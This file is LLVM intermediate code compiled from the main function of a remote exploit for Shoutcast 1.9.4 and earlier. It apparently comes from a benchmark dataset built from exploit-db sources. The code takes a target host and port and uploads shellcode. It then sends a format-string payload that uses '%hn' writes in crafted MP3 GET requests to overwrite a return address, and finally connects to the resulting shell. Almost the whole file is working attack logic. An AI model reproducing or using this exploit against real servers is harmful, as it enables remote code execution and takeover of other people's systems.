; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1456.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1456.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i32, i64 }
%struct.sockaddr_in = type { i32 }

@SHELL_PORT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [43 x i8] c"[!] Shoutcast <= 1.9.4 exploit by crash-x\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"h:p:t:s:S:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"[-] Port %d is invalid\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [35 x i8] c"[-] Wtf are you trying to target?\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"[!] Connecting to target... \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [19 x i8] c"[!] Targeting: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [38 x i8] c"[+]\0A[+] Uploaded shellcode succesful\0A\00", align 1
@.str.7 = private unnamed_addr constant [67 x i8] c"[-]\0A[-] Wasn't able to upload shellcode, server probably crashed!\0A\00", align 1
@.str.8 = private unnamed_addr constant [41 x i8] c"[!] Writing retaddr [%p] to retloc [%p]\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"[-] Connecting failed!\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c"GET /content/DD%s.mp3 HTTP/1.1\0D\0A\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"%%.%uu%%%d$hn%%.%uu%%%d$hn\00", align 1
@.str.12 = private unnamed_addr constant [33 x i8] c"GET /content/%s.mp3 HTTP/1.1\0D\0A\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [20 x i8] c"[-] Exploit failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1024 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i32 0, i32* %11, align 4
  store i32 8000, i32* %12, align 4
  %19 = load i32, i32* @SHELL_PORT, align 4
  store i32 %19, i32* %13, align 4
  store i32 1, i32* %14, align 4
  store i32 7, i32* %15, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 2
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  br label %28

28:                                               ; preds = %23, %2
  br label %29

29:                                               ; preds = %87, %28
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call i32 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  store i32 %32, i32* %10, align 4
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %88

34:                                               ; preds = %29
  %35 = load i32, i32* %10, align 4
  switch i32 %35, label %82 [
    i32 104, label %36
    i32 112, label %38
    i32 116, label %50
    i32 115, label %76
    i32 83, label %79
  ]

36:                                               ; preds = %34
  %37 = load i8*, i8** @optarg, align 8
  store i8* %37, i8** %6, align 8
  br label %87

38:                                               ; preds = %34
  %39 = load i8*, i8** @optarg, align 8
  %40 = call i32 @atoi(i8* %39)
  store i32 %40, i32* %12, align 4
  %41 = load i32, i32* %12, align 4
  %42 = icmp sgt i32 %41, 65535
  br i1 %42, label %46, label %43

43:                                               ; preds = %38
  %44 = load i32, i32* %12, align 4
  %45 = icmp slt i32 %44, 1
  br i1 %45, label %46, label %49

46:                                               ; preds = %43, %38
  %47 = load i32, i32* %12, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %47)
  store i32 1, i32* %3, align 4
  br label %252

49:                                               ; preds = %43
  br label %87

50:                                               ; preds = %34
  %51 = load i8*, i8** @optarg, align 8
  %52 = call i32 @atoi(i8* %51)
  store i32 %52, i32* %11, align 4
  store i32 0, i32* %8, align 4
  br label %53

53:                                               ; preds = %62, %50
  %54 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i64 %56
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %65

61:                                               ; preds = %53
  br label %62

62:                                               ; preds = %61
  %63 = load i32, i32* %8, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %8, align 4
  br label %53

65:                                               ; preds = %53
  %66 = load i32, i32* %11, align 4
  %67 = load i32, i32* %8, align 4
  %68 = icmp sge i32 %66, %67
  br i1 %68, label %69, label %75

69:                                               ; preds = %65
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @usage(i8* %73)
  br label %75

75:                                               ; preds = %69, %65
  br label %87

76:                                               ; preds = %34
  %77 = load i8*, i8** @optarg, align 8
  %78 = call i32 @atoi(i8* %77)
  store i32 %78, i32* %14, align 4
  br label %87

79:                                               ; preds = %34
  %80 = load i8*, i8** @optarg, align 8
  %81 = call i32 @atoi(i8* %80)
  store i32 %81, i32* %15, align 4
  br label %87

82:                                               ; preds = %34
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @usage(i8* %85)
  br label %87

87:                                               ; preds = %82, %79, %76, %75, %49, %36
  br label %29

88:                                               ; preds = %29
  %89 = load i8*, i8** %6, align 8
  %90 = icmp eq i8* %89, null
  br i1 %90, label %91, label %96

91:                                               ; preds = %88
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @usage(i8* %94)
  br label %96

96:                                               ; preds = %91, %88
  %97 = load i8*, i8** %6, align 8
  %98 = call i32 @resolv(%struct.sockaddr_in* %18, i8* %97)
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  %100 = load i32, i32* @stdout, align 4
  %101 = call i32 @fflush(i32 %100)
  %102 = load i32, i32* %11, align 4
  %103 = icmp eq i32 %102, 0
  br i1 %103, label %104, label %113

104:                                              ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %107 = load i32, i32* %106, align 4
  %108 = call i32 @get_target(i32 %107, i32 %105)
  store i32 %108, i32* %11, align 4
  %109 = icmp slt i32 %108, 0
  br i1 %109, label %110, label %112

110:                                              ; preds = %104
  %111 = load i32, i32* %11, align 4
  store i32 %111, i32* %3, align 4
  br label %252

112:                                              ; preds = %104
  br label %122

113:                                              ; preds = %96
  %114 = load i32, i32* %12, align 4
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @get_target(i32 %116, i32 %114)
  %118 = icmp eq i32 %117, -2
  br i1 %118, label %119, label %121

119:                                              ; preds = %113
  %120 = call i32 @exit(i32 -2) #3
  unreachable

121:                                              ; preds = %113
  br label %122

122:                                              ; preds = %121, %112
  %123 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %123, i64 %125
  %127 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %126, i32 0, i32 0
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i8* %128)
  %130 = load i32, i32* %12, align 4
  %131 = load i32, i32* %11, align 4
  %132 = load i32, i32* %15, align 4
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = call i32 @write_shellcode(i32 %134, i32 %130, i32 %131, i32 %132)
  %136 = icmp ne i32 %135, -1
  br i1 %136, label %137, label %139

137:                                              ; preds = %122
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.6, i64 0, i64 0))
  br label %141

139:                                              ; preds = %122
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %252

141:                                              ; preds = %137
  %142 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %142, i64 %144
  %146 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %145, i32 0, i32 1
  %147 = load i32, i32* %146, align 8
  %148 = sext i32 %147 to i64
  %149 = inttoptr i64 %148 to i8*
  %150 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %151 = load i32, i32* %11, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %150, i64 %152
  %154 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %153, i32 0, i32 3
  %155 = load i64, i64* %154, align 8
  %156 = inttoptr i64 %155 to i8*
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.8, i64 0, i64 0), i8* %149, i8* %156)
  %158 = load i32, i32* %12, align 4
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %160 = load i32, i32* %159, align 4
  %161 = call i32 @conn(i32 %160, i32 %158)
  store i32 %161, i32* %9, align 4
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %163, label %165

163:                                              ; preds = %141
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %252

165:                                              ; preds = %141
  %166 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %167 = call i32 @memset(i8* %166, i32 0, i32 1024)
  %168 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %168, i64 %170
  %172 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %171, i32 0, i32 3
  %173 = load i64, i64* %172, align 8
  %174 = inttoptr i64 %173 to i8*
  %175 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %176 = bitcast i8* %175 to i8**
  store i8* %174, i8** %176, align 16
  %177 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %178 = load i32, i32* %11, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %177, i64 %179
  %181 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %180, i32 0, i32 3
  %182 = load i64, i64* %181, align 8
  %183 = add nsw i64 %182, 2
  %184 = inttoptr i64 %183 to i8*
  %185 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %186 = getelementptr inbounds i8, i8* %185, i64 4
  %187 = bitcast i8* %186 to i8**
  store i8* %184, i8** %187, align 8
  %188 = load i32, i32* %9, align 4
  %189 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %190 = call i32 @sockprintf(i32 %188, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0), i8* %189)
  %191 = load i32, i32* %9, align 4
  %192 = call i32 @close(i32 %191)
  %193 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %193, i64 %195
  %197 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 8
  %199 = and i32 %198, -65536
  %200 = lshr i32 %199, 16
  %201 = trunc i32 %200 to i16
  store i16 %201, i16* %16, align 2
  %202 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %202, i64 %204
  %206 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 8
  %208 = and i32 %207, 65535
  %209 = trunc i32 %208 to i16
  store i16 %209, i16* %17, align 2
  %210 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %211 = load i16, i16* %16, align 2
  %212 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %212, i64 %214
  %216 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %215, i32 0, i32 2
  %217 = load i32, i32* %216, align 4
  %218 = add nsw i32 %217, 1
  %219 = load i16, i16* %17, align 2
  %220 = zext i16 %219 to i32
  %221 = load i16, i16* %16, align 2
  %222 = zext i16 %221 to i32
  %223 = sub nsw i32 %220, %222
  %224 = trunc i32 %223 to i16
  %225 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %226 = load i32, i32* %11, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %225, i64 %227
  %229 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %228, i32 0, i32 2
  %230 = load i32, i32* %229, align 4
  %231 = call i32 @snprintf(i8* %210, i32 1024, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0), i16 zeroext %211, i32 %218, i16 zeroext %224, i32 %230)
  %232 = load i32, i32* %12, align 4
  %233 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %234 = load i32, i32* %233, align 4
  %235 = call i32 @conn(i32 %234, i32 %232)
  store i32 %235, i32* %9, align 4
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %237, label %239

237:                                              ; preds = %165
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %252

239:                                              ; preds = %165
  %240 = load i32, i32* %9, align 4
  %241 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %242 = call i32 @sockprintf(i32 %240, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0), i8* %241)
  %243 = load i32, i32* %13, align 4
  %244 = load i32, i32* %14, align 4
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @get_shell(i32 %246, i32 %243, i32 %244)
  %248 = icmp eq i32 %247, -1
  br i1 %248, label %249, label %251

249:                                              ; preds = %239
  %250 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.13, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %252

251:                                              ; preds = %239
  store i32 1, i32* %3, align 4
  br label %252

252:                                              ; preds = %251, %249, %237, %163, %139, %110, %46
  %253 = load i32, i32* %3, align 4
  ret i32 %253
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @resolv(%struct.sockaddr_in*, i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @get_target(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write_shellcode(i32, i32, i32, i32) #1

declare dso_local i32 @conn(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @sockprintf(i32, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i16 zeroext, i32, i16 zeroext, i32) #1

declare dso_local i32 @get_shell(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
